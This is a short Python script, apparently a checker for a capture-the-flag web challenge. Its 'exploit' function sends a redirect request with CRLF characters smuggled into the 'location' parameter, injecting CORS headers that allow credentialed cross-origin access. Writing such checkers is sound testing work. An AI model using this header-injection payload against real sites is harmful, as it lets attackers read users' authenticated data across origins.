import subprocess

from requests import *
import utils
import re


def exploit(host):
    s = Session()
    s.get(f"http://url.{host}/")
    s.get(f"http://url.{host}/create_links_api?link=asdf_checker")
    result = s.get(f"http://url.{host}").content
    if b"asdf_checker" not in result:
        return 0, "failed to create link"
    c = s.get(f"http://url.{host}/redirect?location=a\r\nAccess-Control-Allow-Origin: c\r\nAccess-Control-Allow-Credentials: true")
    for i in c.headers:
        print(i)
    print(c.headers)
    if 'Access-Control-Allow-Credentials' not in c.headers:
        return 0, "failed to bypass auth"

    if 'Access-Control-Allow-Origin' not in c.headers:
        return 0, "failed to bypass cors"
    return 1, ""


FUNCTIONS = [exploit]
if __name__ == "__main__":
    print(exploit("w-va.cf"))